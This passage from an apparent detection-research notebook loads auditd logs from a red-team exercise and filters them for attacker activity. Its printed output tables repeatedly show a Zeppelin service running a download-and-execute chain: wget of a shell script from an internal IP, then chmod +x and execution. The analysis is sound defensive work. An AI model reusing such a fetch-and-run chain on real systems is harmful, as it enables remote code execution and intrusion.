# 5409  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 5410  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 5723  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 5724  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 6442  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 6443  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9126  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9127  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9157  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9672  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9673  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
#
#                                            process.args
# 5409  bash -c wget http://10.7.16.102:8989/scriptAct...
# 5410       wget http://10.7.16.102:8989/scriptAction.sh
# 5723                        bash -c cat scriptAction.sh
# 5724                                cat scriptAction.sh
# 6442  bash -c wget http://10.7.16.102:8989/scriptAct...
# 6443       wget http://10.7.16.102:8989/scriptAction.sh
# 9126                   bash -c chmod +x scriptAction.sh
# 9127                           chmod +x scriptAction.sh
# 9157                          bash -c ./scriptAction.sh
# 9672  bash -c wget http://10.7.16.102:8080/scriptAct...
# 9673       wget http://10.7.16.102:8080/scriptAction.sh

# %%
import fasttext
import numpy as np

import os
import sys
sys.path.append("../../")
from utils.preprocessing import auditdPreprocessTable, auditdReadAndFilterFile

testpath = r"C:\Users\dtrizna\Code\ReverseShellModel\data\auditd_redTeam_Vanquish\hn0-mcvq-h.mcvq-hdi-1\\"
files = os.listdir(testpath)
file = r'C:\Users\dtrizna\Code\ReverseShellModel\data\auditd_redTeam_Vanquish\hn0-mcvq-h.mcvq-hdi-1\2022-10-04--00_30.json'
df = auditdReadAndFilterFile(file)

# %%
argsSlice = df[df['process.args'].notna()]
argsSlice[['process.title', 'process.args']].head()
# Out:
#                                        process.title  \
# 1                        sh -c uname -p 2> /dev/null
# 2                                           uname -p
# 3  /bin/bash --login --noprofile -c service ntp s...
# 4  /bin/bash --login --noprofile -c service ntp s...
# 5                         basename /usr/sbin/service
#
#                                         process.args
# 1                        sh -c uname -p 2> /dev/null
# 2                                           uname -p
# 3  /bin/bash --login --noprofile -c service ntp s...
# 4               /bin/sh /usr/sbin/service ntp status
# 5                         basename /usr/sbin/service

# %%
df['process.title'] = np.where(df['process.args'].notna(), df['process.args'], df['process.title'])
cols = ['process.title', 'process.args']
df[df['process.args'].str.contains('scriptAct', na=False)][cols]
# Out:
#                                           process.title  \
# 5409  bash -c wget http://10.7.16.102:8989/scriptAct...
# 5410       wget http://10.7.16.102:8989/scriptAction.sh
# 5723                        bash -c cat scriptAction.sh
# 5724                                cat scriptAction.sh
# 6442  bash -c wget http://10.7.16.102:8989/scriptAct...
# 6443       wget http://10.7.16.102:8989/scriptAction.sh
# 9126                   bash -c chmod +x scriptAction.sh
# 9127                           chmod +x scriptAction.sh
# 9157                          bash -c ./scriptAction.sh
# 9672  bash -c wget http://10.7.16.102:8080/scriptAct...
# 9673       wget http://10.7.16.102:8080/scriptAction.sh
#
#                                            process.args
# 5409  bash -c wget http://10.7.16.102:8989/scriptAct...
# 5410       wget http://10.7.16.102:8989/scriptAction.sh
# 5723                        bash -c cat scriptAction.sh
# 5724                                cat scriptAction.sh
# 6442  bash -c wget http://10.7.16.102:8989/scriptAct...
# 6443       wget http://10.7.16.102:8989/scriptAction.sh
# 9126                   bash -c chmod +x scriptAction.sh
# 9127                           chmod +x scriptAction.sh
# 9157                          bash -c ./scriptAction.sh
# 9672  bash -c wget http://10.7.16.102:8080/scriptAct...
# 9673       wget http://10.7.16.102:8080/scriptAction.sh

# %% [markdown]
# ## Modified loading function

# %%
import fasttext
import numpy as np

import os
import sys
sys.path.append("../../")
from utils.preprocessing import auditdReadAndFilterFile

file = r'C:\Users\dtrizna\Code\ReverseShellModel\data\auditd_redTeam_Vanquish\hn0-mcvq-h.mcvq-hdi-1\2022-10-04--00_30.json'
df = auditdReadAndFilterFile(file)

# %%
df[df['process.title'].str.contains('scriptAct', na=False)]
# Out:
#                          TimeStamp rule.sidid    hostname auditd.data.syscall  \
# 5409  2022-10-04T00:39:39.2190000Z  execution  hn0-mcvq-h              execve
# 5410  2022-10-04T00:39:39.2190000Z  execution  hn0-mcvq-h              execve
# 5723  2022-10-04T00:43:53.1590000Z  execution  hn0-mcvq-h              execve
# 5724  2022-10-04T00:43:53.1630000Z  execution  hn0-mcvq-h              execve
# 6442  2022-10-04T00:36:15.3190000Z  execution  hn0-mcvq-h              execve
# 6443  2022-10-04T00:36:15.3230000Z  execution  hn0-mcvq-h              execve
# 9126  2022-10-04T00:44:04.5830000Z  execution  hn0-mcvq-h              execve
# 9127  2022-10-04T00:44:04.5870000Z  execution  hn0-mcvq-h              execve
# 9157  2022-10-04T00:44:08.6870000Z  execution  hn0-mcvq-h              execve
# 9672  2022-10-04T00:43:42.5590000Z  execution  hn0-mcvq-h              execve
# 9673  2022-10-04T00:43:42.5630000Z  execution  hn0-mcvq-h              execve
#
#      auditd.summary.actor.primary auditd.summary.actor.secondary  \
# 5409                        unset                       zeppelin
# 5410                        unset                       zeppelin
# 5723                        unset                       zeppelin
# 5724                        unset                       zeppelin
# 6442                        unset                       zeppelin
# 6443                        unset                       zeppelin
# 9126                        unset                       zeppelin
# 9127                        unset                       zeppelin
# 9157                        unset                       zeppelin
# 9672                        unset                       zeppelin
# 9673                        unset                       zeppelin
#
#      auditd.summary.object.primary auditd.summary.object.secondary  \
# 5409                     /bin/bash                             NaN
# 5410                 /usr/bin/wget                             NaN
# 5723                     /bin/bash                             NaN
# 5724                      /bin/cat                             NaN
# 6442                     /bin/bash                             NaN
# 6443                 /usr/bin/wget                             NaN
# 9126                     /bin/bash                             NaN
# 9127                    /bin/chmod                             NaN
# 9157                     /bin/bash                             NaN
# 9672                     /bin/bash                             NaN
# 9673                 /usr/bin/wget                             NaN
#
#                                           process.title  \
# 5409  bash -c wget http://10.7.16.102:8989/scriptAct...
# 5410       wget http://10.7.16.102:8989/scriptAction.sh
# 5723                        bash -c cat scriptAction.sh
# 5724                                cat scriptAction.sh
# 6442  bash -c wget http://10.7.16.102:8989/scriptAct...
# 6443       wget http://10.7.16.102:8989/scriptAction.sh
# 9126                   bash -c chmod +x scriptAction.sh
# 9127                           chmod +x scriptAction.sh
# 9157                          bash -c ./scriptAction.sh
# 9672  bash -c wget http://10.7.16.102:8080/scriptAct...
# 9673       wget http://10.7.16.102:8080/scriptAction.sh
#
#      process.working_directory process.ppid  \
# 5409         /var/lib/zeppelin         9364
# 5410         /var/lib/zeppelin         9364
# 5723         /var/lib/zeppelin         9364
# 5724         /var/lib/zeppelin         9364
# 6442         /var/lib/zeppelin         9364
# 6443         /var/lib/zeppelin         9364
# 9126         /var/lib/zeppelin         9364
# 9127         /var/lib/zeppelin         9364
# 9157         /var/lib/zeppelin         9364
# 9672         /var/lib/zeppelin         9364
# 9673         /var/lib/zeppelin         9364
#
#              process.parent.process.executable  \
# 5409  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 5410  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 5723  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 5724  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 6442  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 6443  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9126  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9127  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9157  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9672  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9673  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
#
#                            process.parent.process.title
# 5409  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 5410  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 5723  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 5724  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 6442  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 6443  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9126  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9127  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9157  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9672  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
# 9673  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...
